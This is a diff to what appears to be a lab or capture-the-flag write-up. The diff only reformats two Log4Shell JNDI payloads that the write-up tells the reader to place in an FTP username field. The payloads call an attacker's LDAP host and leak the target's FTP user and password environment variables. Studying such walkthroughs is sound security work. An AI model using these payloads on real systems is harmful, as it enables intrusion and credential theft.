@@ -163,8 +163,8 @@ It means that we can connect to ftp and in the username parameter put JNDI paylo
 For it to work we need to start jdni exploit kit server as before.  
 Then log into ftp on the target machine twice and use following payloads:  
 ```
-{% raw %} ${jndi:ldap://10.10.14.5:1389/${env:ftp_user}} 
-${jndi:ldap://10.10.14.5:1389/${env:ftp_password}} {% endraw %}
+{% raw %} ${jndi:ldap://10.10.14.5:1389/${env:ftp_user}} {% endraw %}
+{% raw %} ${jndi:ldap://10.10.14.5:1389/${env:ftp_password}} {% endraw %}
 ```
 
 
